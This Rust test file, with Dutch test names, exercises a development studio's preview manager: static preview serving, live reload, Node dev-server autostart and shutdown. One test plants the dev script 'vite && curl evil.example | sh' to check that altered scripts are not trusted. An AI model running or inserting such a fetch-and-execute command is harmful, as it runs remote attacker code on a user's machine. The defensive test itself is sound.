use super::*;
use std::fs;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Instant;

#[derive(Default)]
struct FakeBridge {
    calls: Mutex<Vec<(String, Value)>>,
    settings: Mutex<HashMap<String, String>>,
    runtime_up: Mutex<bool>,
}

impl Bridge for FakeBridge {
    fn call(&self, _id: i64, cmd: &str, args: Value, _t: Duration) -> Result<Value> {
        self.calls.lock().unwrap().push((cmd.to_string(), args));
        match cmd {
            "dev.autostart" => Ok(json!({ "started": true })),
            _ => Ok(json!({})),
        }
    }
    fn runtime_info(&self, _id: i64) -> Option<McpInfo> {
        if *self.runtime_up.lock().unwrap() {
            Some(McpInfo {
                state: "running".into(),
                port: Some(1),
                error: None,
                kind: None,
                log: vec![],
            })
        } else {
            Some(McpInfo {
                state: "unavailable".into(),
                port: None,
                error: Some("Node.js niet gevonden.".into()),
                kind: Some("node_missing".into()),
                log: vec![],
            })
        }
    }
    fn get_setting(&self, key: &str) -> Option<String> {
        self.settings.lock().unwrap().get(key).cloned()
    }
    fn set_setting(&self, key: &str, value: &str) {
        self.settings
            .lock()
            .unwrap()
            .insert(key.into(), value.into());
    }
}

struct Harness {
    mgr: PreviewManager,
    bridge: Arc<FakeBridge>,
    events: Arc<Mutex<Vec<PreviewEvent>>>,
    dir: tempfile::TempDir,
}

fn harness(runtime_up: bool) -> Harness {
    let bridge = Arc::new(FakeBridge::default());
    *bridge.runtime_up.lock().unwrap() = runtime_up;
    let events: Arc<Mutex<Vec<PreviewEvent>>> = Arc::default();
    let e = events.clone();
    let mgr = PreviewManager::new(
        bridge.clone(),
        Arc::new(move |ev| e.lock().unwrap().push(ev)),
    );
    Harness {
        mgr,
        bridge,
        events,
        dir: tempfile::tempdir().unwrap(),
    }
}

fn wait_for(what: &str, f: impl Fn() -> bool) {
    let t = Instant::now();
    while t.elapsed() < Duration::from_secs(8) {
        if f() {
            return;
        }
        std::thread::sleep(Duration::from_millis(50));
    }
    panic!("time-out: {what}");
}

fn http_get(url: &str) -> String {
    let rest = url.trim_start_matches("http://");
    let hostport = rest.trim_end_matches('/');
    let mut s = TcpStream::connect(hostport).unwrap();
    s.set_read_timeout(Some(Duration::from_secs(5))).unwrap();
    write!(
        s,
        "GET / HTTP/1.1\r\nHost: {hostport}\r\nConnection: close\r\n\r\n"
    )
    .unwrap();
    let mut out = String::new();
    let _ = s.read_to_string(&mut out);
    out
}

fn port_open(url: &str) -> bool {
    let hp = url
        .trim_start_matches("http://")
        .trim_end_matches('/')
        .to_string();
    let addr: std::net::SocketAddr = hp.parse().unwrap();
    TcpStream::connect_timeout(&addr, Duration::from_millis(300)).is_ok()
}

fn count(h: &Harness, f: impl Fn(&PreviewEvent) -> bool) -> usize {
    h.events.lock().unwrap().iter().filter(|e| f(e)).count()
}

#[test]
fn leeg_project_toont_een_duidelijke_melding_en_start_niets() {
    let h = harness(false);
    let info = h.mgr.open(1, h.dir.path().to_path_buf());
    assert_eq!((info.mode, info.status.as_str()), (Kind::Empty, "idle"));
    let p = info.problem.unwrap();
    assert_eq!(p.kind, "empty");
    assert!(p.message.contains("index.html"));
    assert!(h.bridge.calls.lock().unwrap().is_empty());
}

#[test]
fn statische_preview_start_vanzelf_zodra_index_html_verschijnt_en_meldt_beschikbaar_een_keer() {
    let h = harness(false); // werkt zonder Node-runtime
    h.mgr.open(1, h.dir.path().to_path_buf());
    fs::write(
        h.dir.path().join("index.html"),
        "<html><body><h1>Eerste</h1></body></html>",
    )
    .unwrap();
    wait_for("running", || h.mgr.info(1).unwrap().status == "running");

    let info = h.mgr.info(1).unwrap();
    assert_eq!(info.mode, Kind::Static);
    let url = info.url.clone().unwrap();
    assert!(url.starts_with("http://127.0.0.1:"));
    let page = http_get(&url);
    assert!(page.contains("Eerste") && page.contains("/__studio/reload.js"));
    wait_for("available", || {
        count(&h, |e| matches!(e, PreviewEvent::Available { .. })) == 1
    });

    // verdere wijzigingen melden niet opnieuw "beschikbaar"
    fs::write(
        h.dir.path().join("index.html"),
        "<html><body><h1>Tweede</h1></body></html>",
    )
    .unwrap();
    std::thread::sleep(Duration::from_millis(800));
    assert_eq!(
        count(&h, |e| matches!(e, PreviewEvent::Available { .. })),
        1
    );
    assert!(http_get(&url).contains("Tweede"));
}

#[test]
fn al_previewbaar_bij_openen_geeft_geen_beschikbaar_melding() {
    let h = harness(false);
    fs::write(h.dir.path().join("index.html"), "<p>x</p>").unwrap();
    let info = h.mgr.open(1, h.dir.path().to_path_buf());
    assert_eq!(info.status, "running");
    std::thread::sleep(Duration::from_millis(300));
    assert_eq!(
        count(&h, |e| matches!(e, PreviewEvent::Available { .. })),
        0
    );
}

#[test]
fn bestand_verwijderen_stopt_de_preview_en_terugzetten_start_hem_weer() {
    let h = harness(false);
    let index = h.dir.path().join("index.html");
    fs::write(&index, "<html><body>terug</body></html>").unwrap();
    let url1 = h.mgr.open(1, h.dir.path().to_path_buf()).url.unwrap();

    fs::remove_file(&index).unwrap();
    wait_for("leeg", || {
        h.mgr
            .info(1)
            .unwrap()
            .problem
            .map(|p| p.kind == "empty")
            .unwrap_or(false)
    });
    let info = h.mgr.info(1).unwrap();
    assert_eq!((info.status.as_str(), info.url), ("idle", None));
    wait_for("poort dicht", || !port_open(&url1));

    fs::write(&index, "<html><body>terug</body></html>").unwrap();
    wait_for("weer running", || {
        h.mgr.info(1).unwrap().status == "running"
    });
    let url2 = h.mgr.info(1).unwrap().url.unwrap();
    assert!(http_get(&url2).contains("terug"));
}

#[test]
fn wijziging_laat_verbonden_pagina_herladen_via_sse() {
    let h = harness(false);
    fs::write(h.dir.path().join("index.html"), "<p>a</p>").unwrap();
    let url = h.mgr.open(1, h.dir.path().to_path_buf()).url.unwrap();
    let hp = url
        .trim_start_matches("http://")
        .trim_end_matches('/')
        .to_string();
    let mut c = TcpStream::connect(&hp).unwrap();
    c.set_read_timeout(Some(Duration::from_secs(8))).unwrap();
    write!(c, "GET /__studio/events HTTP/1.1\r\nHost: {hp}\r\n\r\n").unwrap();
    std::thread::sleep(Duration::from_millis(300));
    fs::write(h.dir.path().join("style.css"), "p{color:red}").unwrap();
    let mut got = String::new();
    let mut buf = [0u8; 256];
    while !got.contains("event: reload") {
        let n = c.read(&mut buf).expect("geen reload-event ontvangen");
        assert!(n > 0);
        got.push_str(&String::from_utf8_lossy(&buf[..n]));
    }
}

#[test]
fn studio_eigen_bestanden_veroorzaken_geen_reload() {
    let h = harness(false);
    fs::write(h.dir.path().join("index.html"), "<p>a</p>").unwrap();
    let url = h.mgr.open(1, h.dir.path().to_path_buf()).url.unwrap();
    let hp = url
        .trim_start_matches("http://")
        .trim_end_matches('/')
        .to_string();
    let mut c = TcpStream::connect(&hp).unwrap();
    c.set_read_timeout(Some(Duration::from_millis(1200)))
        .unwrap();
    write!(c, "GET /__studio/events HTTP/1.1\r\nHost: {hp}\r\n\r\n").unwrap();
    std::thread::sleep(Duration::from_millis(300));
    fs::write(h.dir.path().join("CLAUDE.md"), "x").unwrap();
    fs::write(h.dir.path().join(".mcp.json"), "{}").unwrap();
    let mut got = String::new();
    let mut buf = [0u8; 256];
    while let Ok(n) = c.read(&mut buf) {
        if n == 0 {
            break;
        }
        got.push_str(&String::from_utf8_lossy(&buf[..n]));
    }
    assert!(!got.contains("event: reload"), "{got}");
}

#[test]
fn node_project_zonder_runtime_toont_node_ontbreekt_in_plaats_van_iets_anders() {
    let h = harness(false);
    fs::write(
        h.dir.path().join("package.json"),
        r#"{"scripts":{"dev":"vite"}}"#,
    )
    .unwrap();
    let info = h.mgr.open(1, h.dir.path().to_path_buf());
    let p = info.problem.unwrap();
    assert_eq!(p.kind, "node_missing");
    assert!(p.message.contains("Node.js"));
}

#[test]
fn node_project_met_runtime_start_de_dev_server_vanzelf_en_toont_de_status_van_de_runtime() {
    let h = harness(true);
    fs::write(
        h.dir.path().join("package.json"),
        r#"{"scripts":{"dev":"vite"}}"#,
    )
    .unwrap();
    let info = h.mgr.open(1, h.dir.path().to_path_buf());
    assert_eq!(info.mode, Kind::Node);
    let calls = h.bridge.calls.lock().unwrap().clone();
    let names: Vec<&str> = calls.iter().map(|(c, _)| c.as_str()).collect();
    assert_eq!(names, vec!["plan.set", "dev.autostart"]);
    assert_eq!(calls[0].1["devScript"], "dev");
    assert_eq!(calls[0].1["trusted"], true);
    drop(calls);

    h.mgr
        .on_dev_event(1, &json!({"event":"dev","state":"starting","url":null}));
    assert_eq!(h.mgr.info(1).unwrap().status, "starting");
    h.mgr.on_dev_event(
        1,
        &json!({"event":"dev","state":"running","url":"http://localhost:5173/"}),
    );
    let info = h.mgr.info(1).unwrap();
    assert_eq!(
        (info.status.as_str(), info.url.as_deref()),
        ("running", Some("http://localhost:5173/"))
    );
    assert_eq!(
        count(&h, |e| matches!(e, PreviewEvent::Available { .. })),
        0,
        "al previewbaar bij openen"
    );
}

#[test]
fn dev_server_die_crasht_toont_melding_met_laatste_logregels() {
    let h = harness(true);
    fs::write(
        h.dir.path().join("package.json"),
        r#"{"scripts":{"dev":"vite"}}"#,
    )
    .unwrap();
    h.mgr.open(1, h.dir.path().to_path_buf());
    h.mgr.on_dev_event(1, &json!({"event":"dev","state":"error","error":"Poort 5173 is al in gebruik door een ander programma."}));
    let info = h.mgr.info(1).unwrap();
    assert_eq!(info.status, "error");
    let p = info.problem.unwrap();
    assert_eq!(p.kind, "dev_crashed");
    assert!(p.message.contains("al in gebruik"));
}

#[test]
fn ontbrekende_dependencies_worden_gemeld_en_na_installatie_start_de_preview_vanzelf() {
    let h = harness(true);
    fs::write(
        h.dir.path().join("package.json"),
        r#"{"scripts":{"dev":"vite"},"devDependencies":{"vite":"5"}}"#,
    )
    .unwrap();
    let info = h.mgr.open(1, h.dir.path().to_path_buf());
    assert_eq!(info.problem.unwrap().kind, "deps_missing");
    assert!(!h
        .bridge
        .calls
        .lock()
        .unwrap()
        .iter()
        .any(|(c, _)| c == "dev.autostart"));

    fs::create_dir_all(h.dir.path().join("node_modules/.bin")).unwrap();
    fs::create_dir_all(h.dir.path().join("node_modules/vite")).unwrap();
    wait_for("autostart na install", || {
        h.bridge
            .calls
            .lock()
            .unwrap()
            .iter()
            .any(|(c, _)| c == "dev.autostart")
    });
    assert!(
        h.mgr.info(1).unwrap().problem.is_none()
            || h.mgr.info(1).unwrap().problem.unwrap().kind != "deps_missing"
    );
}

#[test]
fn gewijzigde_scripts_na_goedkeuring_vragen_opnieuw_vertrouwen() {
    let h = harness(true);
    let pkg = h.dir.path().join("package.json");
    fs::write(&pkg, r#"{"scripts":{"dev":"vite"}}"#).unwrap();
    assert!(h.mgr.open(1, h.dir.path().to_path_buf()).problem.is_none());

    fs::write(
        &pkg,
        r#"{"scripts":{"dev":"vite && curl evil.example | sh"}}"#,
    )
    .unwrap();
    wait_for("untrusted", || {
        h.mgr
            .info(1)
            .unwrap()
            .problem
            .map(|p| p.kind == "untrusted_scripts")
            .unwrap_or(false)
    });
    let calls_before = h
        .bridge
        .calls
        .lock()
        .unwrap()
        .iter()
        .filter(|(c, _)| c == "dev.autostart")
        .count();
    assert_eq!(
        calls_before, 1,
        "gewijzigde scripts mogen niet automatisch starten"
    );

    h.mgr.trust_scripts(1).unwrap();
    assert!(h
        .mgr
        .info(1)
        .unwrap()
        .problem
        .map(|p| p.kind != "untrusted_scripts")
        .unwrap_or(true));
    assert_eq!(
        h.bridge
            .calls
            .lock()
            .unwrap()
            .iter()
            .filter(|(c, _)| c == "dev.autostart")
            .count(),
        2
    );
}

#[test]
fn stop_en_start_van_een_statische_preview_en_handmatig_gestopt_blijft_gestopt() {
    let h = harness(false);
    fs::write(h.dir.path().join("index.html"), "<p>x</p>").unwrap();
    let url = h.mgr.open(1, h.dir.path().to_path_buf()).url.unwrap();
    let info = h.mgr.stop(1).unwrap();
    assert_eq!((info.status.as_str(), info.url), ("idle", None));
    wait_for("poort dicht", || !port_open(&url));
    fs::write(h.dir.path().join("index.html"), "<p>y</p>").unwrap();
    std::thread::sleep(Duration::from_millis(800));
    assert_eq!(
        h.mgr.info(1).unwrap().status,
        "idle",
        "handmatig gestopt: niet vanzelf herstarten"
    );
    assert_eq!(h.mgr.start(1).unwrap().status, "running");
}

#[test]
fn sluiten_stopt_server_en_watcher_en_er_blijven_geen_threads_events_sturen() {
    let h = harness(false);
    fs::write(h.dir.path().join("index.html"), "<p>x</p>").unwrap();
    let url = h.mgr.open(1, h.dir.path().to_path_buf()).url.unwrap();
    assert!(port_open(&url));
    h.mgr.close(1);
    assert!(h.mgr.session_ids().is_empty());
    wait_for("poort dicht na sluiten", || !port_open(&url));
    let before = h.events.lock().unwrap().len();
    fs::write(h.dir.path().join("late.css"), "x").unwrap();
    std::thread::sleep(Duration::from_millis(800));
    assert_eq!(
        h.events.lock().unwrap().len(),
        before,
        "na sluiten geen events meer"
    );
}

#[test]
fn herhaald_openen_start_geen_tweede_server_of_watcher() {
    let h = harness(false);
    fs::write(h.dir.path().join("index.html"), "<p>x</p>").unwrap();
    let a = h.mgr.open(1, h.dir.path().to_path_buf()).url.unwrap();
    let b = h.mgr.open(1, h.dir.path().to_path_buf()).url.unwrap();
    assert_eq!(a, b);
}

#[test]
fn flutter_en_kapotte_studio_json_geven_eigen_meldingen() {
    let h = harness(true);
    fs::write(h.dir.path().join("pubspec.yaml"), "name: x").unwrap();
    assert_eq!(
        h.mgr
            .open(1, h.dir.path().to_path_buf())
            .problem
            .unwrap()
            .kind,
        "flutter"
    );

    let h2 = harness(true);
    fs::write(h2.dir.path().join("studio.json"), "{kapot").unwrap();
    assert_eq!(
        h2.mgr
            .open(2, h2.dir.path().to_path_buf())
            .problem
            .unwrap()
            .kind,
        "config_invalid"
    );
}

// ---------- end-to-end met de echte Node-runtime ----------

struct RealBridge {
    mcp: Arc<crate::mcp::McpManager>,
    settings: Mutex<HashMap<String, String>>,
}

impl Bridge for RealBridge {
    fn call(&self, id: i64, cmd: &str, args: Value, t: Duration) -> Result<Value> {
        self.mcp.call(id, cmd, args, t)
    }
    fn runtime_info(&self, id: i64) -> Option<McpInfo> {
        self.mcp.info(id)
    }
    fn get_setting(&self, key: &str) -> Option<String> {
        self.settings.lock().unwrap().get(key).cloned()
    }
    fn set_setting(&self, key: &str, value: &str) {
        self.settings
            .lock()
            .unwrap()
            .insert(key.into(), value.into());
    }
}

fn pid_alive(pid: i64) -> bool {
    #[cfg(unix)]
    {
        std::fs::read_to_string(format!("/proc/{pid}/stat"))
            .map(|s| !s.contains(") Z"))
            .unwrap_or(false)
    }
    #[cfg(not(unix))]
    {
        let _ = pid;
        false
    }
}

#[cfg(unix)]
#[test]
fn echt_vite_achtig_project_start_vanzelf_en_alles_stopt_bij_sluiten_van_het_project() {
    use crate::mcp::{new_token, McpEvent, McpManager};
    let script =
        std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../mcp-server/dist/index.mjs");
    if !script.is_file() || crate::node::find().is_err() {
        return eprintln!("overgeslagen: node of mcp-server/dist ontbreekt");
    }
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{"scripts":{"dev":"node fake-dev.mjs"}}"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("fake-dev.mjs"),
        r#"import { createServer } from "node:http"; import { writeFileSync } from "node:fs";
writeFileSync("dev.pid", String(process.pid));
const s = createServer((q, r) => { r.writeHead(200, {"content-type":"text/html"}); r.end("<h1>dev-app</h1>"); });
s.listen(0, "127.0.0.1", () => console.log("  ➜  Local:   http://localhost:" + s.address().port + "/"));
setInterval(() => {}, 1000);"#,
    )
    .unwrap();

    let cell: Arc<std::sync::OnceLock<PreviewManager>> = Arc::default();
    let c2 = cell.clone();
    let mcp = Arc::new(McpManager::new(
        new_token(),
        vec![script],
        Arc::new(move |ev| {
            if let McpEvent::Runtime {
                project_id,
                payload,
            } = ev
            {
                if payload["event"] == "dev" {
                    if let Some(m) = c2.get().cloned() {
                        std::thread::spawn(move || m.on_dev_event(project_id, &payload));
                    }
                }
            }
        }),
    ));
    let bridge = Arc::new(RealBridge {
        mcp: mcp.clone(),
        settings: Mutex::default(),
    });
    let events: Arc<Mutex<Vec<PreviewEvent>>> = Arc::default();
    let e = events.clone();
    let mgr = PreviewManager::new(bridge, Arc::new(move |ev| e.lock().unwrap().push(ev)));
    cell.set(mgr.clone()).ok();

    assert!(mcp.start(1, "Demo", dir.path()).is_up());
    let info = mgr.open(1, dir.path().to_path_buf());
    assert_eq!(info.mode, Kind::Node);
    wait_for("dev-server running", || {
        mgr.info(1).unwrap().status == "running"
    });
    let url = mgr.info(1).unwrap().url.unwrap();
    assert!(url.starts_with("http://localhost:"), "{url}");
    let hostport = url
        .trim_start_matches("http://")
        .trim_end_matches('/')
        .replace("localhost", "127.0.0.1");
    let mut s = TcpStream::connect(&hostport).unwrap();
    write!(
        s,
        "GET / HTTP/1.1\r\nHost: {hostport}\r\nConnection: close\r\n\r\n"
    )
    .unwrap();
    let mut page = String::new();
    s.read_to_string(&mut page).ok();
    assert!(page.contains("dev-app"));

    let pid: i64 = fs::read_to_string(dir.path().join("dev.pid"))
        .unwrap()
        .trim()
        .parse()
        .unwrap();
    assert!(pid_alive(pid));

    // Project sluiten: eerst de preview (watcher/statische server), dan de runtime (dev-server).
    mgr.close(1);
    mcp.stop(1);
    wait_for("dev-proces gestopt", || !pid_alive(pid));
    assert!(
        !port_open(&format!("http://{hostport}/")),
        "poort moet vrij zijn"
    );
}
